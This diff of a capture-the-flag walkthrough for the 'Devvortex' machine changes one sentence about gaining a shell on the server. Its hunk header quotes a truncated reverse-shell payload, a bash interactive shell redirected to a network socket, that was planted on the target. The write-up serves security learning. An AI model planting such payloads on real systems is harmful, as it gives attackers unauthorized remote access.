@@ -99,7 +99,7 @@ Back on the devvortex system, I add the line `exec("/bin/bash -c 'bash -i >& /de
 
 ![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/46054c87-6b9e-42d8-b9b9-f686fc0709f4)
 
-I save the file, and back on my system, I get a connection and I now have access onto the devvortex server itself:
+I save the file, and back on my system, I get a connection and I now have access to the devvortex server:
 
 ![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/a2d3cf3b-928f-4ed9-a42e-b54ab5626158)
 
